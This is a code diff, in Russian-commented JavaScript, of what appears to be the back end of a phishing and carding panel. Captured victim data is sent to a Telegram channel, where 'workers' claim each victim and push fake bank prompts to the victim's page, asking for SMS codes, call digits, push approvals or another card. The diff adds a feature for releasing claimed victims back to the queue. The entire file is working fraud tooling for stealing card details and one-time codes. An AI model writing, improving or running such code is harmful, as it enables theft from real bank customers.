@@ -28,33 +28,38 @@ const CustomButton = mongoose.model('CustomButton', new mongoose.Schema({
 
 let userTasks = {}; 
 let logsStorage = {}; 
-let waitingForCustomText = {}; // Для режима "Свой текст"
+let waitingForCustomText = {}; 
 
-// Кнопки по умолчанию (если база пуста)
-const defaultButtons = [
-    { name: "💬 СМС", text: "Введите код подтверждения из СМС" },
-    { name: "📞 Звонок", text: "Введите последние 4 цифры номера, с которого поступит звонок" },
-    { name: "📲 Пуш", text: "Подтвердите вход в мобильном приложении" },
-    { name: "💰 Баланс", text: "Недостаточно средств на карте. Попробуйте другую карту" }
-];
-
-// Проверка и создание стандартных кнопок при запуске
+// УМНАЯ ИНИЦИАЛИЗАЦИЯ (без дубликатов)
 async function initButtons() {
-    const count = await CustomButton.countDocuments();
-    if (count === 0) {
-        await CustomButton.insertMany(defaultButtons);
-        console.log("🔹 Дефолтные кнопки добавлены в базу");
+    const defaultButtons = [
+        { name: "💬 СМС", text: "Введите код подтверждения из СМС" },
+        { name: "📞 Звонок", text: "Введите последние 4 цифры номера, с которого поступит звонок" },
+        { name: "📲 Пуш", text: "Подтвердите вход в мобильном приложении" },
+        { name: "💰 Баланс", text: "Недостаточно средств на карте. Попробуйте другую карту" }
+    ];
+
+    for (let btn of defaultButtons) {
+        const exists = await CustomButton.findOne({ name: btn.name });
+        if (!exists) {
+            await new CustomButton(btn).save();
+            console.log(`🔹 Кнопка [${btn.name}] добавлена`);
+        }
     }
 }
 initButtons();
 
 const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
+// Безопасная отправка в TG
 async function sendTg(method, data) {
     try {
         return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, data);
     } catch (e) {
-        console.error(`❌ TG Error [${method}]:`, e.response?.data?.description || e.message);
+        const desc = e.response?.data?.description || "";
+        // Игнорируем технические уведомления TG, чтобы не засорять логи
+        if (desc.includes("message is not modified") || desc.includes("query is too old")) return;
+        console.error(`❌ TG Error [${method}]:`, desc || e.message);
     }
 }
 
@@ -83,9 +88,10 @@ app.post('/api/log', async (req, res) => {
         await sendTg('sendMessage', { chat_id: connection.workerId, text: replyMsg, parse_mode: 'HTML' });
     } else {
         const title = connection ? `⚠️ ПОВТОРНЫЙ ЛОГ` : `🆕 НОВЫЙ ЛОГ`;
+        const status = connection ? `📍 Закреплен за: <b>${connection.workerName}</b>` : `📍 Статус: 🔵 Ожидает...`;
         await sendTg('sendMessage', {
             chat_id: CHANNEL_ID,
-            text: `<b>${title} [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>`,
+            text: `<b>${title} [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n${status}`,
             parse_mode: 'HTML', reply_markup: channelButtons
         });
     }
@@ -105,7 +111,6 @@ app.post('/tg-webhook', async (req, res) => {
     if (message && message.text) {
         const chatId = message.chat.id;
         
-        // Админ-команды
         if (message.text.startsWith('/add_btn')) {
             const parts = message.text.replace('/add_btn ', '').split('|');
             if (parts.length === 2) {
@@ -124,17 +129,15 @@ app.post('/tg-webhook', async (req, res) => {
             return sendTg('sendMessage', { chat_id: chatId, text: "<b>Бот активен.</b>\n\n➕ <code>/add_btn Название | Текст</code>\n🗑 <code>/del_btn</code>", parse_mode: 'HTML' });
         }
 
-        // Логика отправки СВОЕГО ТЕКСТА
         if (waitingForCustomText[chatId]) {
             const targetUserId = waitingForCustomText[chatId];
             userTasks[targetUserId] = { action: 'ask', text: message.text };
             await sendTg('sendMessage', { chat_id: chatId, text: `✅ Отправлено юзеру <code>${targetUserId}</code>`, parse_mode: 'HTML' });
             delete waitingForCustomText[chatId]; 
         } else {
-            // Если вбив пишет просто так — не отправляем на сайт
             const checkWorker = await Worker.findOne({ workerId: chatId });
             if (checkWorker) {
-                await sendTg('sendMessage', { chat_id: chatId, text: "⚠️ Текст не отправлен. Нажмите кнопку <b>'✍️ Свой текст'</b>, чтобы отправить сообщение юзеру.", parse_mode: 'HTML' });
+                await sendTg('sendMessage', { chat_id: chatId, text: "⚠️ Текст не отправлен. Нажмите кнопку <b>'✍️ Свой текст'</b>.", parse_mode: 'HTML' });
             }
         }
     }
@@ -143,17 +146,17 @@ app.post('/tg-webhook', async (req, res) => {
         const workerId = callback_query.from.id;
         const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
         const [action, userId, btnId] = callback_query.data.split('_');
+        const channelMsgId = callback_query.message.message_id;
 
         await sendTg('answerCallbackQuery', { callback_query_id: callback_query.id });
 
         if (action === 'deleteBtn') {
             await CustomButton.findByIdAndDelete(userId); 
-            return sendTg('editMessageText', { chat_id: workerId, message_id: callback_query.message.message_id, text: "🗑 Удалено!" });
+            return sendTg('editMessageText', { chat_id: workerId, message_id: channelMsgId, text: "🗑 Удалено!" });
         }
 
         if (action === 'take') {
             await Worker.findOneAndUpdate({ targetUserId: userId }, { workerId, workerName }, { upsert: true });
-            
             const dbButtons = await CustomButton.find();
             let keyboard = [];
             for (let i = 0; i < dbButtons.length; i += 2) {
@@ -162,13 +165,39 @@ app.post('/tg-webhook', async (req, res) => {
                 keyboard.push(row);
             }
             keyboard.push([{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]);
+            // Передаем ID сообщения канала, чтобы его можно было вернуть в исходное состояние
+            keyboard.push([{ text: "🔓 ОСВОБОДИТЬ ЛОГ", callback_data: `release_${userId}_${channelMsgId}` }]);
 
             const log = logsStorage[userId];
             let fullMsg = `<b>💎 УПРАВЛЕНИЕ [<code>${userId}</code>]</b>\n\n`;
             if (log) for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }
 
             await sendTg('sendMessage', { chat_id: workerId, text: fullMsg, parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } });
-            await sendTg('editMessageText', { chat_id: CHANNEL_ID, message_id: callback_query.message.message_id, text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${workerName}</b>`, parse_mode: 'HTML' });
+            await sendTg('editMessageText', { 
+                chat_id: CHANNEL_ID, 
+                message_id: channelMsgId, 
+                text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${workerName}</b>`, 
+                parse_mode: 'HTML' 
+            });
+        }
+
+        if (action === 'release') {
+            const originalMsgId = btnId; 
+            await Worker.findOneAndDelete({ targetUserId: userId });
+            
+            await sendTg('editMessageText', {
+                chat_id: CHANNEL_ID,
+                message_id: originalMsgId,
+                text: `<b>🆕 ЛОГ ОСВОБОЖДЕН</b>\n🆔 ID: <code>${userId}</code>\n📍 Статус: 🔵 Ожидает...`,
+                parse_mode: 'HTML',
+                reply_markup: { 
+                    inline_keyboard: [
+                        [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
+                        [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
+                    ] 
+                }
+            });
+            await sendTg('sendMessage', { chat_id: workerId, text: `🔓 Юзер <code>${userId}</code> освобожден.`, parse_mode: 'HTML' });
         }
 
         if (action === 'use') {
@@ -181,7 +210,7 @@ app.post('/tg-webhook', async (req, res) => {
 
         if (action === 'custom') {
             waitingForCustomText[workerId] = userId;
-            await sendTg('sendMessage', { chat_id: workerId, text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>\n<i>(Следующее ваше сообщение будет отправлено ему)</i>`, parse_mode: 'HTML' });
+            await sendTg('sendMessage', { chat_id: workerId, text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`, parse_mode: 'HTML' });
         }
     }
     res.sendStatus(200);
